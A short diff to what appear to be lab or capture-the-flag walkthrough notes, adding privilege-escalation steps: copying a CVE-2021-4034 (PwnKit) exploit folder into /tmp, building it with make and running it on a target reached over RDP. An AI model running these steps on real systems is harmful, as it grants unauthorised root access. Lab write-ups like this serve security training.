@@ -63,6 +63,14 @@
 
 # 9 PRIVILEGE ESCALATION
 * login with RDP
+* terminal
+* mkdir /tmp/pwnkit
+* mv CVE-2021-4034 /tmp/pwnkit/
+* cd /tmp
+* cd pwnkit
+* cd CVE-2021-4034/
+* make
+* ./CVE-2021-4034 
 
 # 10 ENTRYPOINT ADRDRESS
 * login into ggiven machine
